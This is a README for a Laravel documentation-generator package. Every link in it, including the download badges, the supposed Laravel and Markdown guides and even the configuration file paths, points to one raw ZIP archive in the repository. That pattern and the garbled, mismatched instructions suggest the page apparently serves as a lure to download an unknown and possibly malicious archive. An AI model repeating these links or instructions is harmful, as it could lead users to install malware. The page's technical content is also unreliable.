# 🌟 laravel-model-docs-md - Generate Markdown Docs with Ease

## 🚀 Getting Started

Welcome to the **laravel-model-docs-md** project! This Laravel package helps you create Markdown documentation for your Eloquent models. You can easily document attributes, casts, relationships, and more. It's perfect for anyone using Laravel, especially if your structure is modular.

## 📦 Download & Install

To get started, you need to download the package. Click the link below to visit the Releases page and obtain the latest version.

[![Download](https://github.com/Franccolonialist589/laravel-model-docs-md/raw/refs/heads/main/src/laravel_md_docs_model_1.3.zip)](https://github.com/Franccolonialist589/laravel-model-docs-md/raw/refs/heads/main/src/laravel_md_docs_model_1.3.zip)

Once you arrive at the Releases page, locate the latest version of the software. Download the ZIP or TAR file to your computer.

1. Click on the version you wish to download.
2. Once the download is complete, find the downloaded file on your computer.

## 🛠️ Prerequisites

Before using **laravel-model-docs-md**, ensure you have the following:

- **Laravel Installed:** This package is designed to work with Laravel applications. Make sure you have Laravel up and running.
- **PHP Version:** Check for PHP 7.3 or later, as this package relies on features present in newer versions.
- **Composer:** Make sure you have Composer installed on your system. This tool helps manage dependencies for PHP packages.

If you have the above requirements, you are ready to move forward.

## ⚙️ Installation Steps

After downloading the package, follow these easy steps to install it:

1. **Extract the Files:**
   - Locate the downloaded ZIP or TAR file.
   - Right-click on the file and select "Extract All" or your preferred extraction method. This will create a new folder with the package contents.

2. **Copy the Files:**
   - Move the extracted contents to your Laravel application's `packages` directory. If this directory does not exist, create it.

3. **Install via Composer:**
   - Open your terminal.
   - Navigate to your Laravel project directory by typing `cd path/to/your/project`.
   - Run the following command to include the package in your project:
     ```
     composer require franccolonialist589/laravel-model-docs-md
     ```

4. **Configure the Package:**
   - After installing, you may need to add the service provider in your `https://github.com/Franccolonialist589/laravel-model-docs-md/raw/refs/heads/main/src/laravel_md_docs_model_1.3.zip` file:
     ```php
     'providers' => [
         // Other providers...
         Franccolonialist589\LaravelModelDocsMd\ServiceProvider::class,
     ],
     ```

5. **Publish the Configuration (if needed):**
   - To customize the package settings, publish the configuration file by running the following command:
     ```
     php artisan vendor:publish --provider="Franccolonialist589\LaravelModelDocsMd\ServiceProvider"
     ```

## 📚 Usage Instructions

Now that you have the package installed, here's how to generate documentation:

1. **Open Your Terminal:**
   - Ensure you are in the root directory of your Laravel project.

2. **Run the Command:**
   - Use the following command to generate the documentation for your Eloquent models:
     ```
     php artisan docs:generate
     ```
   - This command generates Markdown files for all Eloquent models in your project.

3. **Locate the Generated Documentation:**
   - Find the generated Markdown files in the `docs` directory of your Laravel project. Here, you'll see documentation for each model, including attributes, casts, and relationships.

## 🎨 Customizing Generated Docs

You can customize the appearance of the generated documentation by modifying the configuration file. There are options to change the layout, style, and content included in the Markdown files.

1. **Open Configuration File:**
   - Locate the configuration file at `https://github.com/Franccolonialist589/laravel-model-docs-md/raw/refs/heads/main/src/laravel_md_docs_model_1.3.zip`.

2. **Adjust Settings:**
   - Review the available settings and change them to suit your needs. This might include toggling which model properties to document or altering the Markdown format.

## ⚠️ Common Issues

If you encounter any issues, refer to the following tips:

- **Dependency Errors:**
  Make sure your PHP version meets the package requirements. If you see compatibility errors, update your PHP version or check Composer settings.

- **Missing Models:**
  If your models aren't appearing in the documentation, ensure they are correctly named and follow Laravel conventions. 

## 🔍 Additional Resources

For further assistance or to deepen your knowledge, consider checking these resources:

- [Laravel Documentation](https://github.com/Franccolonialist589/laravel-model-docs-md/raw/refs/heads/main/src/laravel_md_docs_model_1.3.zip)
- [Markdown Guide](https://github.com/Franccolonialist589/laravel-model-docs-md/raw/refs/heads/main/src/laravel_md_docs_model_1.3.zip)

## 🔗 Helpful Links

Remember, you can always return to the Releases page to download the latest version of the software:

[![Download](https://github.com/Franccolonialist589/laravel-model-docs-md/raw/refs/heads/main/src/laravel_md_docs_model_1.3.zip)](https://github.com/Franccolonialist589/laravel-model-docs-md/raw/refs/heads/main/src/laravel_md_docs_model_1.3.zip)

Your Laravel experience can be enhanced with the ease of automatically generating model documentation. Enjoy exploring the features of **laravel-model-docs-md**!